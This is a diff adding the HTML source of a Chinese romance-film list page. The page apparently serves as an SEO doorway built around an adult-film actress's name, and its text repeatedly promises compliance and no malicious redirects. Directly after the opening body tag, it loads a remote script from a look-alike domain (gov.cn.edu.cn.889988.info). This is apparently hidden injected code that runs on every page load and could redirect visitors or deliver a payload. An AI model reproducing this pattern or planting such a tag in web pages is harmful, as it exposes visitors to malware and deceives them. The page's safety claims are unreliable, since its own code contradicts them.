@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>爱情电影网 - 浪漫爱情电影片单与影人资料</title>
+<meta name="description" content="爱情电影网整理经典爱情电影、银幕情侣、浪漫片单与观影指南；含公开影人资料词条，内容合规、移动端自适应。">
+<meta name="keywords" content="爱情电影网,爱情电影,浪漫片单,经典电影,影人资料,电影推荐">
+<meta name="author" content="爱情电影网">
+<link rel="canonical" href="https://aiqingdianyingwangboduoyejieyi-h5.github.io/">
+<style>
+*,*::before,*::after{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif;background:#fff7f9;color:#3a2730;line-height:1.75}
+a{text-decoration:none;color:inherit}
+img{max-width:100%;display:block}
+
+/* 导航 */
+.nav{position:sticky;top:0;z-index:50;background:rgba(255,247,249,.9);backdrop-filter:blur(8px);border-bottom:1px solid #f3d7df}
+.nav__box{max-width:1180px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;padding:.8rem 1rem;flex-wrap:wrap;gap:.5rem}
+.nav__logo{font-weight:900;color:#d6336c;font-size:1.25rem}
+.nav__logo b{color:#3a2730}
+.nav__links{display:flex;gap:.3rem;flex-wrap:wrap}
+.nav__links a{padding:.4rem .8rem;border-radius:999px;font-size:.88rem;color:#a3687b}
+.nav__links a:hover{background:#ffe3ec;color:#d6336c}
+
+/* Hero */
+.hero{max-width:1180px;margin:2rem auto;padding:0 1rem}
+.hero__card{border-radius:26px;overflow:hidden;background:linear-gradient(135deg,#ffd9e6,#ffeef3 60%,#fff);display:grid;grid-template-columns:1.2fr .8fr}
+.hero__left{padding:3rem 2rem}
+.hero__tag{display:inline-block;font-size:.75rem;letter-spacing:2px;color:#d6336c;border:1px solid #f3b6c8;padding:.2rem .8rem;border-radius:999px;margin-bottom:1rem}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:1rem}
+.hero h1 em{font-style:normal;color:#d6336c}
+.hero p{color:#7a5563;max-width:520px;margin-bottom:1.6rem}
+.hero__btn{display:inline-block;background:#d6336c;color:#fff;font-weight:800;padding:.8rem 2rem;border-radius:999px}
+.hero__right{display:flex;align-items:center;justify-content:center;font-size:7rem}
+
+/* 通用 */
+.wrap{max-width:1180px;margin:3.5rem auto;padding:0 1rem}
+.head{display:flex;align-items:baseline;gap:1rem;margin-bottom:1.5rem}
+.head h2{font-size:1.6rem}
+.head h2 span{color:#d6336c}
+.head a{margin-left:auto;color:#a3687b;font-size:.85rem}
+
+/* 栏目1：爱情片单 卡片 */
+.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:1.2rem}
+.card{background:#fff;border:1px solid #f3d7df;border-radius:18px;overflow:hidden;transition:.3s}
+.card:hover{transform:translateY(-6px);box-shadow:0 18px 40px rgba(214,51,108,.15)}
+.card__top{height:150px;display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff}
+.card__body{padding:1rem}
+.card__body h3{font-size:1rem;margin-bottom:.2rem}
+.card__body p{font-size:.82rem;color:#9b7484}
+
+/* 栏目2：银幕情侣 左右分栏 */
+.couple{display:grid;grid-template-columns:1fr 1fr;gap:1.5rem}
+.couple__main{border-radius:20px;min-height:360px;color:#fff;position:relative;overflow:hidden;display:flex;align-items:flex-end;padding:2rem;background:linear-gradient(135deg,#d6336c,#843a5b)}
+.couple__main h3{font-size:1.6rem;margin-bottom:.4rem}
+.couple__main p{color:rgba(255,255,255,.85)}
+.couple__list{display:flex;flex-direction:column;gap:.8rem}
+.couple__row{display:flex;gap:.8rem;align-items:center;background:#fff;border:1px solid #f3d7df;border-radius:14px;padding:.7rem .9rem}
+.couple__ava{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;color:#fff;font-weight:800;flex:none}
+.couple__row h4{font-size:.95rem}
+.couple__row small{color:#9b7484}
+
+/* 栏目3：影人词条 时间线 */
+.person{display:grid;grid-template-columns:280px 1fr;gap:1.5rem;background:#fff;border:1px solid #f3d7df;border-radius:20px;padding:1.5rem}
+.person__side{text-align:center}
+.person__avatar{width:140px;height:140px;border-radius:50%;margin:0 auto 1rem;background:linear-gradient(135deg,#d6336c,#ffd9e6);display:flex;align-items:center;justify-content:center;font-size:3rem;color:#fff}
+.person__side h3{font-size:1.2rem}
+.person__side p{font-size:.82rem;color:#9b7484}
+.person__bio h4{margin:1rem 0 .4rem;color:#d6336c}
+.person__bio p{color:#5e4451;font-size:.92rem}
+.notice{margin-top:1rem;background:#fff4f6;border:1px dashed #f3b6c8;color:#a3687b;font-size:.82rem;padding:.7rem 1rem;border-radius:12px}
+
+/* 栏目4：观影指南 步骤 */
+.steps{display:grid;grid-template-columns:repeat(auto-fill,minmax(240px,1fr));gap:1.2rem}
+.step{background:#fff;border:1px solid #f3d7df;border-radius:18px;padding:1.3rem;position:relative}
+.step__no{font-size:2rem;font-weight:900;color:#f3b6c8}
+.step h4{margin:.3rem 0;font-size:1.02rem}
+.step p{font-size:.86rem;color:#7a5563}
+
+/* 页脚 */
+.foot{margin-top:4rem;background:#3a2730;color:#f3d7df;text-align:center;padding:2.5rem 1rem}
+.foot b{color:#fff}
+.foot a{color:#ffb3c6;margin:0 .4rem}
+.foot small{display:block;margin-top:.8rem;color:#b98ca0}
+
+@media(max-width:860px){
+  .hero__card{grid-template-columns:1fr}
+  .hero__right{min-height:150px;font-size:4.5rem}
+  .couple{grid-template-columns:1fr}
+  .person{grid-template-columns:1fr}
+}
+@media(max-width:560px){
+  .nav__box{justify-content:center}
+  .head h2{font-size:1.3rem}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/laoliu.js"></script>
+
+<header class="nav">
+  <div class="nav__box">
+    <div class="nav__logo">爱情<b>电影网</b></div>
+    <nav class="nav__links">
+      <a href="#films">爱情片单</a>
+      <a href="#couples">银幕情侣</a>
+      <a href="#person">影人词条</a>
+      <a href="#guide">观影指南</a>
+    </nav>
+  </div>
+</header>
+
+<section class="hero">
+  <div class="hero__card">
+    <div class="hero__left">
+      <span class="hero__tag">ROMANCE FILM LIBRARY</span>
+      <h1>爱情电影网<br><em>经典浪漫片单 · 影人资料 · 观影指南</em></h1>
+      <p>爱情电影网只做合规内容：整理经典爱情电影、银幕情侣、公开影人词条与正版观影渠道，不提供成人资源、不引导盗版下载。</p>
+      <a href="#films" class="hero__btn">浏览片单 ›</a>
+    </div>
+    <div class="hero__right">💗</div>
+  </div>
+</section>
+
+<section class="wrap" id="films">
+  <div class="head"><h2>经典<span>爱情片单</span></h2><a href="#">更多 ›</a></div>
+  <div class="grid">
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#d6336c,#ff9bb3)">🎬</div><div class="card__body"><h3>情书</h3><p>纯爱 / 1995 / 暗恋与回忆</p></div></article>
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#843a5b,#d98aa6)">🎬</div><div class="card__body"><h3>爱乐之城</h3><p>音乐爱情 / 2016 / 梦想与遗憾</p></div></article>
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#ff9bb3,#ffe3ec)">🎬</div><div class="card__body"><h3>时空恋旅人</h3><p>奇幻爱情 / 2013 / 家庭与陪伴</p></div></article>
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#d6336c,#843a5b)">🎬</div><div class="card__body"><h3>花样年华</h3><p>文艺爱情 / 2000 / 克制与暧昧</p></div></article>
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#ffb3c6,#ffd9e6)">🎬</div><div class="card__body"><h3>怦然心动</h3><p>青春爱情 / 2010 / 成长与心动</p></div></article>
+    <article class="card"><div class="card__top" style="background:linear-gradient(135deg,#843a5b,#5e2f45)">🎬</div><div class="card__body"><h3>爱在黎明破晓前</h3><p>公路爱情 / 1995 / 对话与相遇</p></div></article>
+  </div>
+</section>
+
+<section class="wrap" id="couples">
+  <div class="head"><h2>银幕<span>情侣</span></h2><a href="#">更多 ›</a></div>
+  <div class="couple">
+    <div class="couple__main">
+      <div>
+        <h3>爱情电影里的“经典一对”</h3>
+        <p>不是靠猎奇，而是靠角色、台词、镜头和情绪留住观众。</p>
+      </div>
+    </div>
+    <div class="couple__list">
+      <div class="couple__row"><div class="couple__ava" style="background:#d6336c">A</div><div><h4>杰克与露丝</h4><small>《泰坦尼克号》· 灾难中的浪漫</small></div></div>
+      <div class="couple__row"><div class="couple__ava" style="background:#843a5b">B</div><div><h4>周慕云与苏丽珍</h4><small>《花样年华》· 克制爱情</small></div></div>
+      <div class="couple__row"><div class="couple__ava" style="background:#ff9bb3;color:#843a5b">C</div><div><h4>米娅与塞巴斯蒂安</h4><small>《爱乐之城》· 梦想与分手</small></div></div>
+      <div class="couple__row"><div class="couple__ava" style="background:#5e2f45">D</div><div><h4>杰西与塞琳娜</h4><small>《爱在》三部曲· 对话爱情</small></div></div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="person">
+  <div class="head"><h2>公开<span>影人词条</span></h2><a href="#">更多 ›</a></div>
+  <div class="person">
+    <div class="person__side">
+      <div class="person__avatar">波</div>
+      <h3>波多野结衣（公开资料词条）</h3>
+      <p>日本演艺人物公开信息整理</p>
+    </div>
+    <div class="person__bio">
+      <h4>词条说明</h4>
+      <p>本页仅整理互联网公开的人物背景、作品类型、大众文化影响等信息，用于电影/大众文化研究，不提供、不索引、不跳转任何成人影像资源。</p>
+      <h4>内容边界</h4>
+      <p>不展示裸露画面、不提供盗版播放地址、不引导安装播放器、不收集用户隐私、不设置“解锁完整版”等诱导交互。</p>
+      <h4>合规提醒</h4>
+      <p>成人内容在不同地区有不同法律边界；用户应遵守所在地法律法规，通过正规授权平台与合法渠道接触影视内容。</p>
+      <div class="notice">⚠️ 爱情电影网拒绝擦边聚合、盗版资源和恶意跳转；本站点内容面向“电影文化/片单/资料”场景。</div>
+    </div>
+  </div>
+</section>
+
+<section class="wrap" id="guide">
+  <div class="head"><h2>正版<span>观影指南</span></h2><a href="#">更多 ›</a></div>
+  <div class="steps">
+    <div class="step"><div class="step__no">01</div><h4>选类型</h4><p>纯爱、暗恋、异地、婚后、青春、文艺、喜剧爱情，先定情绪再选片。</p></div>
+    <div class="step"><div class="step__no">02</div><h4>看片单</h4><p>用“导演+年份+地区”组合，比只搜人名更容易找到优质爱情片。</p></div>
+    <div class="step"><div class="step__no">03</div><h4>走正版</h4><p>优先正规视频平台、影院重映、官方发行蓝光/流媒体，避免来路不明播放器。</p></div>
+    <div class="step"><div class="step__no">04</div><h4>防风险</h4><p>弹窗要求装插件、输银行卡、关杀毒软件，立即关页面；不明 APK/EXE 不下载。</p></div>
+  </div>
+</section>
+
+<footer class="foot">
+  <div><b>爱情电影网</b> · 爱情片单 / 银幕情侣 / 影人资料 / 正版指南</div>
+  <div style="margin-top:.6rem">
+    <a href="#films">爱情片单</a>|
+    <a href="#couples">银幕情侣</a>|
+    <a href="#person">影人词条</a>|
+    <a href="#guide">观影指南</a>|
+    <a href="#">关于</a>|
+    <a href="#">免责声明</a>
+  </div>
+  <small>官网：https://aiqingdianyingwangboduoyejieyi-h5.github.io</small>
+  <small>© 2025 爱情电影网 仅做影视文化与片单整理，不提供成人影像资源</small>
+</footer>
+
+</body>
+</html>
